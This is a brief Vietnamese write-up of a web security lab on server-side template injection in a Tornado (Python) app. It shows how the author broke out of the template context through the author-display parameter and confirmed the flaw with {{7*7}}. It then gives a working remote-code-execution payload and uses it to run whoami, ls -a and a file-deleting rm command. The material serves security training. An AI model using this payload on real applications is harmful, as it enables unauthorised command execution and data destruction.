# Basic server-side template injection (code context)

__Xác định vấn đề__

Ở challenge này chúng ta sẽ kết hợp 2 việc sau:

+ Đầu tiên thay đổi đầu vào với __blog_post_author_display__, xác định 2 vấn đề: không thể thực thi xss và traceback trả lại thông báo lỗi của ứng dụng tornado (python)

![image-20220718001812580](https://user-images.githubusercontent.com/68894302/179419328-74f46c91-2d58-4fe9-9951-e22a34063185.png)

+ Đầu ra kết quả được render tại __user.firstname__ nếu choice option là `firstname`, hoặc cũng có thể là `name`, `nickname`. 

__Khai thác__

Thoát ra khỏi ngữ cảnh để thực thi SSTI bằng cách dùng hai dấu đóng `}}`. Sau đó inject `{{7*7}}` load lại comment và thấy kết quả trả về như sau: 

![image](https://user-images.githubusercontent.com/68894302/179417304-13b264a4-45be-4930-b312-5bf1693b368a.png)

Bây giờ đã biết ứng dụng sử dụng tornado nên chúng ta có thể dễ dàng RCE :v:

Payload: __}}{%+import+os+%}{{{{os.system('whoami')}}}}__

1. __whoami__

   ![image](https://user-images.githubusercontent.com/68894302/179417423-40fe7dea-d040-4c09-aab6-e262069cc75a.png)

2. __ls -a__

   ![image](https://user-images.githubusercontent.com/68894302/179417469-04a2c136-75b5-497a-a9a9-1096210c3218.png)

3. __rm -f /home/carlos/morale.txt__

   ![image](https://user-images.githubusercontent.com/68894302/179417620-fcf096ef-1a02-41d8-8e41-336de595151d.png)
